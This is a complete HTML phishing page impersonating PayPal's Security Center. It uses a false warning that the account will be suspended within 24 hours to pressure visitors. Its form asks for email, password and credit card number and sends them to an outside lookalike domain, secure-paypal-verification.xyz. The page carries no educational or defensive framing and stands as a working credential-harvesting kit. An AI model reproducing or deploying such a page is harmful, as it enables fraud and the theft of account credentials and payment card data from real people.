<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Security Center - Account Verification</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f5f7fa; margin: 0; padding: 0; }
        .nav { background: #003087; padding: 1.25rem 2rem; color: #fff; font-size: 1.4rem; font-weight: bold; }
        .box { max-width: 480px; margin: 3rem auto; background: #fff; padding: 2rem; border-radius: 6px; border: 1px solid #e1e7eb; }
        .warn { background: #fff3cd; color: #856404; padding: 12px; border-left: 5px solid #ffeeba; margin-bottom: 20px; font-size: 0.9rem; }
        .field { margin-bottom: 1rem; }
        label { display: block; font-size: 0.85rem; font-weight: 600; color: #444; margin-bottom: 0.3rem; }
        input { width: 100%; padding: 0.75rem; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; background: #0070ba; color: #fff; padding: 0.85rem; border: none; font-size: 1rem; border-radius: 20px; font-weight: bold; cursor: pointer; }
        .links { text-align: center; margin-top: 1.5rem; font-size: 0.8rem; }
        .links a { color: #0070ba; text-decoration: none; margin: 0 5px; }
    </style>
</head>
<body>
    <div class="nav">PayPal</div>
    <div class="box">
        <h2>Confirm Your Identity</h2>
        <div class="warn">
            Your PayPal account will be suspended within 24 hours due to an unauthorized transaction. Please update payment method and confirm password to restore full access.
        </div>
        <form action="http://secure-paypal-verification.xyz/restore.php" method="POST">
            <div class="field">
                <label>Email address</label>
                <input type="text" name="email" required>
            </div>
            <div class="field">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <div class="field">
                <label>Credit / Debit Card Number</label>
                <input type="text" name="cc_number" placeholder="4xxx xxxx xxxx xxxx" required>
            </div>
            <button type="submit">Verify Immediately</button>
        </form>
        <div class="links">
            <a href="#">Security</a> | <a href="#">Contact</a> | <a href="#">Privacy</a>
        </div>
    </div>
</body>
</html>
